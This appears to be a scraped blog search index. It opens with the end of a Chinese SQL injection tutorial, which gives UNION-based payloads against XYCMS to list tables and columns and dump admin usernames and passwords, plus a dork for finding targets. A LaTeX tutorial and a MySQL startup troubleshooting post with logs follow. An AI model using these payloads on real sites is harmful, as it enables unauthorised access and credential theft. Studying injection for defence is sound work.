select * from result union select 1,2,3,4; select id,name,score from result union select 1,2,3; 1select c1,c2,...,cn from result union select d1,d2,...dm; 后半句union select查询的字段数（m）必须与前半句select查询的字段数（n）相等，数据库才能正常显示结 果。与order by相似，可以利用这个特点判断数据库查询的字段数。 12select id,city from result where id=1 and 1=2 union select name,score fromresult; 从以上结果可以总结，在已知字段名的情况下，攻击者只要将该字段置于任何能够显示的位置，就可以暴露该 字段的值。 MySQL（MariaDB）5.5以上版本自带information_schema数据库，其中保存着关于MySQL服务器所维护的所 有其他数据库的信息，如数据库名、数据库的表、表栏的数据类型与访问权限等。可以把 information_schema数据库看作MySQL（MariaDB）的“目录”！ （1）尝试执行以下两条语句： 123show databases；select schema_name from information_schema.schemata; 两条语句执行结果相同！ （2）尝试执行以下两组语句： 第一组： 123use student;show tables; 第二组： 1select table_name from information_schema.tables where table_schema='student'; information_schema使用 已知数据库查询表 1select table_name from information_schema.tables where table_schema='student'; 已知表查询列 1select column_name from information_schema.columns where table_name='result'; 查询列中数据 1select name,score from result; mysql常用函数 12345678910system_user() 系统用户名user() 用户名current_user 当前用户名session_user() 连接数据库的用户名database() 数据库名version() MYSQL数据库版本load_file() 转成16进制或者是10进制MYSQL读取本地文件的函数@@datadir 读取数据库路径@@basedir MYSQL安装路径@@version_compile_os 操作系统 实战案例使用案例为XYCMS 联合查询 可以爆出非数字类型的列 1and 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,10 爆出所xycms所有的表 12and 1=2 UNION SELECT 1,group_concat(table_name),3,4,5,6,7,8,9,10 frominformation_schema.tables where table_schema='xycms' 防止单引号过滤可以将数据库名转为16进 12and 1=2 UNION SELECT 1,group_concat(table_name),3,4,5,6,7,8,9,10 frominformation_schema.tables where table_schema=0x7879636D73 爆出列名 12and 1=2 UNION SELECT 1,group_concat(column_name),3,4,5,6,7,8,9,10 frominformation_schema.columns where table_name='manage_user' 爆出用户名和密码 12and 1=2 UNION SELECT 1,group_concat(m_name,0x5c,m_pwd),3,4,5,6,7,8,9,10 frommanage_user 探测数据库名 1php?id = -13 union select 1,2,3,4,5,6,7,database(),9,0 inurl php?id=汽车 id=8 order by 3–+ –也是注释 网址里+会转成空格 select * from xy_pro where id=13; 黑客工具使用显错注入","link":"/2021/09/28/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/"},{"title":"LaTeX编程","text":"LaTeX环境的安装与配置https://mirrors.tuna.tsinghua.edu.cn/ctan/systems/texlive/Images/ http://texstudio.sourceforge.net/ tex live为例 LaTeX更新：tlmgr update --all 创建目录，保存文件 \\documentclass{article} 引入一个文档类，撰写论文相关操作 \\begin{document} ……（撰写文档） \\end{document} 命令行中的操作：latex test.tex dvipdfmx test.dvi del *.aux *.dvi *.log 可以做成批处理文件 xelatex直接将LaTeX文件编译为PDF文件 支持中文的编码为utf-8 ，并且引入宏包\\usepackage{ctex} 选项——构建——XeLaTeX，方便支持中文 LaTeX源文件的基本结构123456789101112131415161718% 导言区,全局设置% 一个LaTeX文件有且只有一个document环境\\documentclass{article} % book, report, letter 改变排版结构\\title{My First Document}\\author{xiao kai}\\date{\\today}% 正文区（文稿区）\\begin{document} % *环境名称*为document \\maketitle % 输出标题 Hello World！ % here is my big formula % 空行为换行 Let$f(x)$be define by the formula $f(x)=3x^2+x-1$ % 单$表示行内公式 $$f(x)=3x^2+x-1$$你好啊 % 双$表示行间公式\\end{document} LaTeX中的中文处理方式TeXstdio —&gt; 选项 —&gt; 设置 —&gt; 构建 —&gt; XeLaTeX ​ —&gt; 编辑器 —&gt; UTF-8 123456789101112131415161718192021% 导言区\\documentclass{article} % book, report, letter 改变排版结构\\usepackage{ctex}\\title{\\heiti 哦哦}\\newcommand\\degree{^\\circ} % 定义新命令\\author{\\kaishu 小凯}\\date{\\today}%正文区 \\begin{document} % *环境名称*为document \\maketitle % 输出标题 Hello World！ % here is my big formula \\begin{equation} AB^2 = BC^2 + AC^2. \\end{equation} % 输出带有编号的行间公式 \\end{document} cmd：texdoc ctex ctex宏集提供：ctexart、ctexrep、ctexbook文档类 ctexbook, ctexreport 12\\documentclass{cteart} % book, report, letter 改变排版结构% \\usepackage{ctex} cmd：texdoc lshort-zh LaTeX学习文档 LaTeX的字体字号设置在LaTeX中，一个字体有5种属性 字体编码 正文字体编码：OT1、T1、EU1等 数字字体编码：OML、OMS、OMX等 字体族 罗马字体：笔画起始处有装饰 无衬线字体：笔画起始处无装饰 打字机字体：每个字符宽度相同，又称等宽字体 字体系列 粗细 宽度 字体形状 直立 斜体 伪斜体 小型大写 字体大小 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152% 导言区\\documentclass{article} % \\documentclass[10, 11, 12]{article}\\usepackage{ctex}\\newcommand{\\myfont}{\\textbf{\\textsf{Fancy Text}}}% 正文区（文稿区）\\begin{document} % 字体族设置（罗马字体、无衬线字体、打字机字体） \\textrm{Roman Family} % \\textsf{Sans Serif Family} \\texttt{Typewriter Family} \\rmfamily Roman Family % 字体声明 {\\sffamily Sans Serif Family}{\\ttfamily Typewriter Family} % 使用大括号进行分组，声明字体分组的作用范围 % 字体系列设置（粗细、宽度） \\textmd{Medium Series} \\textbf{Boldface Series} {\\mdseries Medium Series} {\\bfseries Boldface Series} % 字体形状（直立、斜体、伪斜体、小型大写） \\textup{Upright Shape} \\textit{Italic Shape} \\textsl{Slanted Shape} \\textsc{Small Caps Shape} {\\upshape Upright Shape} {\\itshape Italic Shape} {\\slshape Slanted Shape} {\\scshape Small Caps Shape} % 中文字体 {\\songti 宋体} \\quad {\\heiti 黑体} \\quad {\\fangsong 仿宋} \\quad {\\kaishu 楷书} 中文字体的\\textbf{粗体}与\\textit{斜体} % 黑体与楷体 %字体大小 {\\tiny HEllo}\\\\ {\\scriptsize HEllo}\\\\ {\\footnotesize HEllo}\\\\ {\\small HEllo}\\\\ {\\normalsize HEllo}\\\\ {\\large HEllo}\\\\ {\\Large HEllo}\\\\ {\\LARGE HEllo}\\\\ {\\huge HEllo}\\\\ {\\Huge HEllo}\\\\ % 中文字号设置命令 \\zihao{-0} 你好！ % -0表示小初号 \\myfont % 执行newcommand定义的新命令 \\end{document} LaTeX文档的基本结构12345678910111213141516171819202122232425% 导言区\\documentclass{article} %ctexbook, ctexrep% 使用ctexart时标题居中排版\\usepackage{ctex}% 正文区（文稿区）\\begin(document) \\tableofcontents % 产生文档的目录 \\chapter{绪论} % 产生带章节的大纲 ctexbook \\section{引言} % 创建小节 之后对耳环无符号\\par IU会很热v % \\par产生新的段落 \\section{实验方法} \\section{实验结果} \\subsection{数据} % 创建子小节 \\subsection{图表} \\subsubsection{实验条件} % 创建子小节的子小节 \\subsubsection{实验过程} \\subsection{结果分析} \\section{结论} \\section{致谢} \\end{document} \\\\反斜杠实现换行 空行实现新的段落 \\par产生新的段落 LaTeX中的特殊字符1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283% 导言区\\documentclass{article} %ctexbook, ctexrep% 使用ctexart时标题居中排版\\usepackage{ctex}% 正文区（文稿区）\\begin(document) \\section{空白符号} % 创建小节 % 空白分行，多个空行等同于1个 % 自动缩进，绝对不能使用空格代替 % 英文中多个空格自动处理为1个空格，中文中空格将被忽略 % 汉字与其它字符的间距会自动由XeLaTeX处理 % 禁止使用中文全角空格 % 1em（当前字体中M的宽度） a\\quad b % 2em a\\qquad b % 约为1/6个em a\\,b a\\thinspace b % 0.5个em a\\enspace b % 空格 a\\ b % 硬空格 a~b % 1pc=12pt=4.218mm a\\kern 1pc b % 产生指定宽度空白 a\\kern -1em b a\\hskip 1em b a\\hspace{35pt}b % 占位宽度 a\\hphantom{xyz}b % 参数的宽度 % 弹性长度 a\\hfill b \\section{\\LaTeX 控制符} \\# \\$ \\% \\{ \\} \\~{} \\_{} \\^{} \\textbackslash % \\ \\&amp; \\section{排版符号} \\S \\P \\dag \\ddag \\copyright \\pounds % §¶†‡©£ \\section{\\Tex 标志符号} % 基本符号 \\TeX{} \\LaTeX{} \\LaTeXe % TEX LATEX LATEX 2 \\XeLaTeX % usepackage{xltxtra} 针对XeTeX的改进并且加入了XeTeX的LOGO \\section{引号} ` ' `` '' % ‘ ’ “ ” \\section{连字符} - -- --- % - – — \\section{非英文字符} \\oe \\OE \\ae \\AE \\aa \\AA \\o \\O \\1 \\L \\ss \\SS !` ?` % œŒæÆåÅøØłŁß \\section{重音符号（以o为例} \\`o \\'o \\^o \\''o \\~o \\=o \\.o \\u{o} \\v{o} \\H{o} \\r{o} \\t{o} \\b{o} \\c{o} \\d{o} % ò ó ô ’́o õ ō ȯ ŏ ǒ ő o̊ o o̲ o \\end{document} LaTeX中的插图123456789101112131415161718192021222324% 导言区： \\usepackage{graphicx}% 语 法： \\includegraphics[&lt;选项&gt;]{&lt;文件名&gt;}% 格 式： EPS, PDF, PNG, JPEG, BMP\\usepackage{graphicx}\\graphicspath{{figures/}, {pics/}} % 图片在当前目录下的figures目录% 正文区\\begin{document} \\LaTeX{}中的插图 \\includegraphics{lion} % 后缀名可加可不加 \\includegraphics[scale=0.3]{lion} % 指定缩放因子 \\includegraphics[height=2cm]{lion} % 固定值的图像高度 \\includegraphics[width=2cm]{lion} % 固定值的图像宽度 \\includegraphics[height=0.1\\textheight]{lion} % 版型文本0.1倍的图像高度 \\includegraphics[width=0.2\\textheight]{lion} % 版型文本0.2倍的图像宽度 \\includegraphics[angle=-45, width=0.2\\textheight]{lion} % 旋转角度，同时指定多个参数 \\end{document} LaTeX中的表格1234567891011121314151617181920212223242526% \\begin{tabular}[&lt;垂直对齐方式&gt;]{&lt;列格式说明&gt;}% &lt;表项&gt; &amp; &lt;表项&gt; &amp; … &amp; &lt;表项&gt; \\\\% ……% \\end{tabular}% 用\\\\表示换行% 用&amp;表示不同的列% l-本列左对齐% c-本列居中对齐% r-本列右对齐% p{&lt;宽&gt;}-本列宽度固定，能够自动换行% 正文区（文稿区）\\begin{document} \\begin{tabular}{l c c c r} % 必选参数，生成5列，分别为左中中中右对齐 % \\begin{tabular}{l|c|c|c|r} % 产生表格竖线 % \\begin{tabular}{|l||c||c|c|r|} % 双竖线与边界线 % \\begin{tabular}{l|c|c|c|p{1.5cm}|} % 指定表格宽度，超过后自动换行 姓名 &amp; 语文 &amp; 数学 &amp; 外语 &amp; 备注\\\\ % 不同列之间用&amp;分割 % \\\\结束表格的一行 张三 &amp; 87 &amp; 100 &amp; 93 &amp; 优秀 \\\\ \\hline % 产生表格横线 李四 &amp; 75 &amp; 64 &amp; 52 &amp; 补考另行通知\\\\ \\hline \\hline % 产生双横线 王二 &amp; 80 &amp; 82 &amp; 78 &amp; \\end{tabular}\\end{document} texdoc booktab : 三线表 texdoc longtab : 跨页长表格 texdoc tabu ：综合表格宏包 LaTeX中的浮动体123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657% 浮动体% 实现灵活分页（避免无法分割的内容产生的页面留白）% 给图标添加标题% 交叉引用% figure环境（table环境与之类似）% \\begin{figure}[&lt;允许位置&gt;]% &lt;任意内容&gt;% \\end{figure}% &lt;允许位置&gt;参数(默认tbp)% h，此处（here）-代码所在的上下文位置% t，页顶（top）-代码所在页面或之后页面的顶部% b，页底（bottom）-代码所在页面或之后页面的底部% p，独立一页（page）-浮动页面% 标题控制（caption、bicaption等宏包）% 并排与子图表（subcaption、subfig、floatrow等宏包）% 绕排（picinpar、wrapfig等宏包）\\usepackage{graphicx}\\graphicspath{{figures/}, {pics/}} % 图片在当前目录下的figures目录% 正文区\\begin{document} \\LaTeX{}中的插图 % \\LaTeX{}中的插图\\ref{fig} % 交叉引用 \\begin{figure} % \\begin{figure}[htbp] % 指定浮动体的排版位置 允许各个位置 \\centering % 环境中的内容居中排版 \\includegraphics[scale=0.3]{lion} % 指定缩放因子 \\caption{设置插图的标题} % 会自动进行编号 \\caption{设置插图的标题}\\label{fig} % 设置标签 \\end{figure} 在\\LaTeX{}中的表格： % 在\\LaTeX{}中的表格：\\ref{tab-score} \\begin{table} % \\begin{table}[h] % 排版位置参数 \\centering % 环境中的内容居中排版 \\caption{考试成绩单} % \\caption{考试成绩单}\\label{tab-score} \\begin{tabular}{l c c c r} % 必选参数，生成5列，分别为左中中中右对齐 \\hline 姓名 &amp; 语文 &amp; 数学 &amp; 外语 &amp; 备注\\\\ % 不同列之间用&amp;分割 % \\\\结束表格的一行 张三 &amp; 87 &amp; 100 &amp; 93 &amp; 优秀 \\\\ \\hline % 产生表格横线 李四 &amp; 75 &amp; 64 &amp; 52 &amp; 补考另行通知\\\\ \\hline \\hline % 产生双横线 王二 &amp; 80 &amp; 82 &amp; 78 &amp; \\\\ \\end{tabular} \\end{table}\\end{document} LaTeX数学公式初步1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374\\begin{document} 交换律是$a+b=b+a$,如\\(1+2=2+1=3\\) 交换律是\\begin{math}a+b=b+a\\end{math},如 \\begin{math}1+2=2+1=3\\end{math} $3x^2 - x + 2 = 0$ % 上标 $3x^{20} - x + 2 = 0$ % 上标 $3x^{3x^2 - x + 2 = 0} - x + 2 = 0$ % 上标 $a_0, a_1, a_2,..., a_{100}&amp; % 下标 % 希腊字母 $\\alpha$ $\\beta$ $\\gamma$ $\\epsilon$ $\\pi$ $\\omega$ $\\Gamma$ $\\Delta$ $\\Theta$ $\\Pi$ $\\Omega$ $\\alpha^3 + \\beta^2 + \\gamma = 0$ % 数学函数 $\\log$ $\\sin$ $\\cos$ $\\arcsin$ $\\arccos$ $\\ln$ $\\sin^2 x + \\cos^2 x = 1$ $y = \\arcsin x$ $\\sqrt[4]{x}$ % 分式 大约是体积的$3/4$ 大约是体积的$\\frac{3}{4}$ % 行间公式 $$ 1 + 1 = 2$$ \\[1 + 2 = 2 + 1 = 3\\] % displaymath环境 \\begin{displaymath} 1 + 2 = 2 + 1 = 3 \\end{displaymath} % 自动编号公式equation环境 \\begin{equation} \\end{equation} % 实现公式的交叉引用 交换律见式\\ref{eq:commutative} \\begin{equation} a + b = b + a \\label{eq:commutative} \\end{equation} % 不编号公式equation*环境 交换律见式\\ref{eq:commutative2} \\begin{equation*} a + b = b + a \\label{eq:commutative2} % 此时交叉引用编号为小节编号 \\end{equation*} % 不自动编号的须使用\\usepackage{amsmath} \\end{document}\\bar\\hat\\tilde 公式的编号与交叉引用是自动实现的，排版中，要习惯于采用自动化的方式处理诸如图、表、公式编号与交叉引用。 LaTeX数学模式的矩阵123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107\\usepackage{amsmath}% 正文区\\begin{document} % 矩阵环境，用&amp;分隔列，用\\\\分隔行 \\[ \\begin{matrix} 0 &amp; 1 \\\\ 1 &amp; 0 \\end{matrix} % 矩阵两端添加小括号 \\begin{pmatrix} 0 &amp; 1 \\\\ 1 &amp; 0 \\end{pmatrix} \\qquad % 添加中括号 \\begin{bmatrix} 0 &amp; 1 \\\\ 1 &amp; 0 \\end{bmatrix} \\qquad % 添加大括号 \\begin{Bmatrix} 0 &amp; 1 \\\\ 1 &amp; 0 \\end{Bmatrix} \\qquad % 添加单竖线 \\begin{vmatrix} 0 &amp; 1 \\\\ 1 &amp; 0 \\end{vmatrix} \\qquad % 添加双竖线 \\begin{Vmatrix} 0 &amp; 1 \\\\ 1 &amp; 0 \\end{Vmatrix} \\qquad \\] % 可以使用上下标 \\[ A = \\begin{pmatrix} a_{11}^2 &amp; a_{12}^2 &amp; a_{13}^2 \\\\ 0 &amp; a_{22} &amp; a_{23} \\\\ 0 &amp; 0 &amp; a_{33} \\end{pmatrix} \\] % 常用省略号：\\dots \\vdots \\ddots \\[ A = \\begin{bmatrix} a_{11} &amp; \\dots &amp; a_{1n} \\\\ &amp; \\ddots &amp; \\vdots \\\\ 0 &amp; &amp; a_{nn} \\end{bmatrix}_{n \\times n} % \\times可以排版乘号 \\] % 分块矩阵（矩阵嵌套） \\[ \\begin{pmatrix} \\begin{matrix} 1&amp;0 \\\\ 0&amp;1 \\end{matrix} &amp; \\text{\\large 0}\\\\ % 需使用\\text临时转为文本模式 \\text{\\large 0} &amp; \\begin{matrix} 1&amp;0\\\\0&amp;-1 \\end{matrix} \\end{pmatrix} \\] % 三角矩阵 \\[ \\begin{pmatrix} a_{11} &amp; a_{12} &amp; \\cdots &amp; a_{1n} \\\\ &amp; a_{22} &amp; \\cdots &amp; a_{2n} \\\\ &amp; &amp; \\ddots &amp; \\vdots \\\\ \\multicolumn{2}{c}{\\raisebox{1.3ex}[0 pt]{\\Huge 0}} &amp; &amp;a_{nn} \\end{pmatrix} \\] % \\multicolumn合并多列 \\raisebox限制高度 % 跨列的省略号：\\hdotsfor{&lt;列数&gt;} \\[ \\begin{pmatrix} 1 &amp; \\frac 12 &amp; \\dots &amp; \\frac 1n \\\\ \\hdotsfor{4} \\\\ m &amp; \\frac m2 &amp; \\dots &amp; \\frac mn \\end{pmatrix} \\] % 行内小矩阵（smallmatrix）环境 复数$z = (x,y)$也可用矩阵 \\begin{math} \\left( % 需要手动添加左括号 \\begin{smallmatrix} x &amp; -y \\\\ y &amp; x \\end{smallmatrix} \\right) % 需要手动添加右括号 \\end{math} % array环境（类似于表格环境tabular） \\[ \\begin{array}{r|r} \\frac 12 &amp; 0 \\\\ \\hline 0 &amp; -\\frac a{bc} \\end{array} \\]\\end{document} LaTeX中的多行数学公式1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253\\usepackage{amsmath}\\usepackage{amssymb}% 正文区\\begin{document} % gather和gather*环境（可以使用\\\\换行） % 带编号 \\begin{gather} a + b = b + a \\\\ ab ba \\end{gather} \\begin{gather*} a + b = b + a \\\\ ab ba \\end{gather*} \\begin{gather} a + b = b + a \\notag \\\\ % \\notag阻止编号 ab ba \\notag \\\\ abc \\end{gather} % align 和align*环境（用&amp;进行对齐） \\begin{align} x &amp;= t + \\cos t + 1 \\\\ y &amp;= 2\\sin t \\end{align} \\begin{align*} x &amp;= t + \\cos t + 1 \\\\ y &amp;= 2\\sin t \\end{align*} % &amp;= 按等号对齐 % split 环境（对齐采用align环境的方式，编号在中间） \\begin{equation} \\begin{split} \\cos 2x &amp;= \\cos^2 x - \\sin^2 x \\\\ &amp;= 2\\cos^2 x - 1 \\end{split} \\end{equation} % cases环境 % 每行公式中使用&amp;分割为两个部分 % 通常表示值和后面的条件 \\begin{equation} D(x) = \\begin{cases} 1, &amp; \\text{如果 } x \\in \\mathbb{Q}; \\\\ 0, &amp; \\text{如果 } x \\in \\mathbb{R}\\setminus\\mathbb{q} \\end{cases} % \\in属于 \\mathbb花体字符\\usepackage{amssymb}支持 \\text临时换成文本模式，不加则数学公式无法显示中文 \\end{equation}\\end{document} LaTeX中的参考文献——BibTeX123456789101112\\begin{document} % 一次管理，一次使用 % 参考文献格式： % \\begin{thebibliography}{编号样本} % \\bibitem[记号]{引用标志}文献条目1 % \\bibitem[记号]{引用标志}文献条目2 % ...... % \\end(thebibliography) % 其中文献条目包括：作者，题目，出版社，年代，版本，页码等 % 引用时候要可以采用：\\cite{引用标志1，引用标志2，...} % 引用一篇文章\\cite{article1} 引用一本书\\cite{book1}等等 生成.aux的辅助文件 https://www.zotero.org/download/ 不同的数据库是不同的bio文件 \\nocite{*}显示未引用文件 LaTeX中的参考文献BibLaTeX 改变需要先清理上次编译的辅助文件 工具——&gt;清理辅助文件 c：中文 e：英文 n：作者姓名 t：文献标识 y：出版年份 ce：先中文再英文 ec：先英文再中文 编译两次 LaTeX中的自定义命令和环境123% \\newcommand -定义命令% 命令只能由字母组成，不能以\\end开头% \\newcommand&lt;命令&gt;[&lt;参数个数&gt;][&lt;首参数默认值&gt;]{&lt;具体定义&gt;} 定义参数","link":"/2021/08/14/LaTeX%E6%95%99%E7%A8%8B/"},{"title":"Centos7中的启动MySQL出现问题及解决方案","text":"当输入命令 1~]# systemctl start mysql.service 得到： 12Failed to start mysql.service: Unit is not loaded properly: Bad message.See system logs and 'systemctl status mysql.service' for details. 说明启动不成功 1~]# systemctl status mysql.service 123456789101112131415 mysql.service Loaded: error (Reason: Bad message) Active: inactive (dead)9月 07 23:16:39 server1 systemd[1]: [/etc/systemd/system/mysql.s....9月 07 23:18:27 server1 systemd[1]: [/etc/systemd/system/mysql.s....9月 07 23:18:27 server1 systemd[1]: [/etc/systemd/system/mysql.s....9月 07 23:18:27 server1 systemd[1]: [/etc/systemd/system/mysql.s....9月 07 23:19:55 server1 systemd[1]: [/etc/systemd/system/mysql.s....9月 07 23:19:55 server1 systemd[1]: [/etc/systemd/system/mysql.s....9月 07 23:19:55 server1 systemd[1]: [/etc/systemd/system/mysql.s....9月 07 23:30:00 server1 systemd[1]: [/etc/systemd/system/mysql.s....9月 07 23:30:00 server1 systemd[1]: [/etc/systemd/system/mysql.s....9月 07 23:30:00 server1 systemd[1]: [/etc/systemd/system/mysql.s....Hint: Some lines were ellipsized, use -l to show in full. 然而/etc/systemd/system/mysql.service的文件如下： 1234567891011121314cat &gt;/etc/systemd/system/mysql.service &lt;&lt;EOF[unit]Description=MySQL ServerDocumentation=man:mysqld(8)Documentation=http://dev.mysql.com/doc/refman/en/using-systemd.htmlAfter=network.targetAfter=syslog.target[install]WantedBy=multi-user.target[Service]User=mysqlGroup=mysqlExecStart=/application/mysql/bin/mysqld --defaults-file=/etc/my.cnfLimitNOFILE = 5000 查看日志 cat /data/mysql/data/hostname.err 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771782021-09-07T14:37:07.202054Z 0 [Warning] TIMESTAMP with implicit DEFAULT value is deprecated. Please use --explicit_defaults_for_timestamp server option (see documentation for more details).2021-09-07T14:37:07.202124Z 0 [Note] --secure-file-priv is set to NULL. Operations related to importing and exporting data are disabled2021-09-07T14:37:07.202142Z 0 [Note] /application/mysql/bin/mysqld (mysqld 5.7.26) starting as process 11278 ...2021-09-07T14:37:07.255263Z 0 [Note] InnoDB: PUNCH HOLE support available2021-09-07T14:37:07.255281Z 0 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins2021-09-07T14:37:07.255284Z 0 [Note] InnoDB: Uses event mutexes2021-09-07T14:37:07.255287Z 0 [Note] InnoDB: GCC builtin __sync_synchronize() is used for memory barrier2021-09-07T14:37:07.255289Z 0 [Note] InnoDB: Compressed tables use zlib 1.2.112021-09-07T14:37:07.255291Z 0 [Note] InnoDB: Using Linux native AIO2021-09-07T14:37:07.255464Z 0 [Note] InnoDB: Number of pools: 12021-09-07T14:37:07.255535Z 0 [Note] InnoDB: Using CPU crc32 instructions2021-09-07T14:37:07.257236Z 0 [Note] InnoDB: Initializing buffer pool, total size = 128M, instances = 1, chunk size = 128M2021-09-07T14:37:07.263139Z 0 [Note] InnoDB: Completed initialization of buffer pool2021-09-07T14:37:07.264802Z 0 [Note] InnoDB: If the mysqld execution user is authorized, page cleaner thread priority can be changed. See the man page of setpriority().2021-09-07T14:37:07.323740Z 0 [Note] InnoDB: Highest supported file format is Barracuda.2021-09-07T14:37:07.419956Z 0 [Note] InnoDB: Creating shared tablespace for temporary tables2021-09-07T14:37:07.420077Z 0 [Note] InnoDB: Setting file './ibtmp1' size to 12 MB. Physically writing the file full; Please wait ...2021-09-07T14:37:07.431712Z 0 [Note] InnoDB: File './ibtmp1' size is now 12 MB.2021-09-07T14:37:07.432597Z 0 [Note] InnoDB: 96 redo rollback segment(s) found. 96 redo rollback segment(s) are active.2021-09-07T14:37:07.432605Z 0 [Note] InnoDB: 32 non-redo rollback segment(s) are active.2021-09-07T14:37:07.433583Z 0 [Note] InnoDB: 5.7.26 started; log sequence number 25249852021-09-07T14:37:07.434612Z 0 [Note] InnoDB: Loading buffer pool(s) from /data/mysql/data/ib_buffer_pool2021-09-07T14:37:07.434876Z 0 [Note] Plugin 'FEDERATED' is disabled.2021-09-07T14:37:07.519839Z 0 [Warning] Failed to set up SSL because of the following SSL library error: SSL context is not usable without certificate and private key2021-09-07T14:37:07.519865Z 0 [Note] Server hostname (bind-address): '*'; port: 33062021-09-07T14:37:07.520761Z 0 [Note] IPv6 is available.2021-09-07T14:37:07.520781Z 0 [Note] - '::' resolves to '::';2021-09-07T14:37:07.520800Z 0 [Note] Server socket created on IP: '::'.2021-09-07T14:37:07.531657Z 0 [Note] InnoDB: Buffer pool(s) load completed at 210907 22:37:072021-09-07T14:37:07.620858Z 0 [Note] Failed to start slave threads for channel ''2021-09-07T14:37:07.768594Z 0 [Note] Event Scheduler: Loaded 0 events2021-09-07T14:37:07.769182Z 0 [Note] /application/mysql/bin/mysqld: ready for connections.Version: '5.7.26' socket: '/tmp/mysql.sock' port: 3306 MySQL Community Server (GPL)2021-09-07T14:39:03.314273Z 0 [Note] Giving 0 client threads a chance to die gracefully2021-09-07T14:39:03.314316Z 0 [Note] Shutting down slave threads2021-09-07T14:39:03.314324Z 0 [Note] Forcefully disconnecting 0 remaining clients2021-09-07T14:39:03.314329Z 0 [Note] Event Scheduler: Purging the queue. 0 events2021-09-07T14:39:03.314451Z 0 [Note] Binlog end2021-09-07T14:39:03.314877Z 0 [Note] Shutting down plugin 'ngram'2021-09-07T14:39:03.314886Z 0 [Note] Shutting down plugin 'BLACKHOLE'2021-09-07T14:39:03.314890Z 0 [Note] Shutting down plugin 'ARCHIVE'2021-09-07T14:39:03.314892Z 0 [Note] Shutting down plugin 'partition'2021-09-07T14:39:03.314894Z 0 [Note] Shutting down plugin 'INNODB_SYS_VIRTUAL'2021-09-07T14:39:03.314897Z 0 [Note] Shutting down plugin 'INNODB_SYS_DATAFILES'2021-09-07T14:39:03.314899Z 0 [Note] Shutting down plugin 'INNODB_SYS_TABLESPACES'2021-09-07T14:39:03.314901Z 0 [Note] Shutting down plugin 'INNODB_SYS_FOREIGN_COLS'2021-09-07T14:39:03.314913Z 0 [Note] Shutting down plugin 'INNODB_SYS_FOREIGN'2021-09-07T14:39:03.314915Z 0 [Note] Shutting down plugin 'INNODB_SYS_FIELDS'2021-09-07T14:39:03.314917Z 0 [Note] Shutting down plugin 'INNODB_SYS_COLUMNS'2021-09-07T14:39:03.314919Z 0 [Note] Shutting down plugin 'INNODB_SYS_INDEXES'2021-09-07T14:39:03.314921Z 0 [Note] Shutting down plugin 'INNODB_SYS_TABLESTATS'2021-09-07T14:39:03.314923Z 0 [Note] Shutting down plugin 'INNODB_SYS_TABLES'2021-09-07T14:39:03.314926Z 0 [Note] Shutting down plugin 'INNODB_FT_INDEX_TABLE'2021-09-07T14:39:03.314928Z 0 [Note] Shutting down plugin 'INNODB_FT_INDEX_CACHE'2021-09-07T14:39:03.314931Z 0 [Note] Shutting down plugin 'INNODB_FT_CONFIG'2021-09-07T14:39:03.314932Z 0 [Note] Shutting down plugin 'INNODB_FT_BEING_DELETED'2021-09-07T14:39:03.314934Z 0 [Note] Shutting down plugin 'INNODB_FT_DELETED'2021-09-07T14:39:03.314936Z 0 [Note] Shutting down plugin 'INNODB_FT_DEFAULT_STOPWORD'2021-09-07T14:39:03.314938Z 0 [Note] Shutting down plugin 'INNODB_METRICS'2021-09-07T14:39:03.314939Z 0 [Note] Shutting down plugin 'INNODB_TEMP_TABLE_INFO'2021-09-07T14:39:03.314941Z 0 [Note] Shutting down plugin 'INNODB_BUFFER_POOL_STATS'2021-09-07T14:39:03.314942Z 0 [Note] Shutting down plugin 'INNODB_BUFFER_PAGE_LRU'2021-09-07T14:39:03.314944Z 0 [Note] Shutting down plugin 'INNODB_BUFFER_PAGE'2021-09-07T14:39:03.314946Z 0 [Note] Shutting down plugin 'INNODB_CMP_PER_INDEX_RESET'2021-09-07T14:39:03.314947Z 0 [Note] Shutting down plugin 'INNODB_CMP_PER_INDEX'2021-09-07T14:39:03.314949Z 0 [Note] Shutting down plugin 'INNODB_CMPMEM_RESET'2021-09-07T14:39:03.314950Z 0 [Note] Shutting down plugin 'INNODB_CMPMEM'2021-09-07T14:39:03.314952Z 0 [Note] Shutting down plugin 'INNODB_CMP_RESET'2021-09-07T14:39:03.314954Z 0 [Note] Shutting down plugin 'INNODB_CMP'2021-09-07T14:39:03.314955Z 0 [Note] Shutting down plugin 'INNODB_LOCK_WAITS'2021-09-07T14:39:03.314957Z 0 [Note] Shutting down plugin 'INNODB_LOCKS'2021-09-07T14:39:03.314959Z 0 [Note] Shutting down plugin 'INNODB_TRX'2021-09-07T14:39:03.314960Z 0 [Note] Shutting down plugin 'InnoDB'2021-09-07T14:39:03.315224Z 0 [Note] InnoDB: FTS optimize thread exiting.2021-09-07T14:39:03.315594Z 0 [Note] InnoDB: Starting shutdown...2021-09-07T14:39:03.418386Z 0 [Note] InnoDB: Dumping buffer pool(s) to /data/mysql/data/ib_buffer_pool2021-09-07T14:39:03.420270Z 0 [Note] InnoDB: Buffer pool(s) dump completed at 210907 22:39:032021-09-07T14:39:04.743034Z 0 [Note] InnoDB: Shutdown completed; log sequence number 25250132021-09-07T14:39:04.744169Z 0 [Note] InnoDB: Removed temporary tablespace data file: &quot;ibtmp1&quot;2021-09-07T14:39:04.744181Z 0 [Note] Shutting down plugin 'MEMORY'2021-09-07T14:39:04.744185Z 0 [Note] Shutting down plugin 'PERFORMANCE_SCHEMA'2021-09-07T14:39:04.744209Z 0 [Note] Shutting down plugin 'MRG_MYISAM'2021-09-07T14:39:04.744213Z 0 [Note] Shutting down plugin 'MyISAM'2021-09-07T14:39:04.744226Z 0 [Note] Shutting down plugin 'CSV'2021-09-07T14:39:04.744243Z 0 [Note] Shutting down plugin 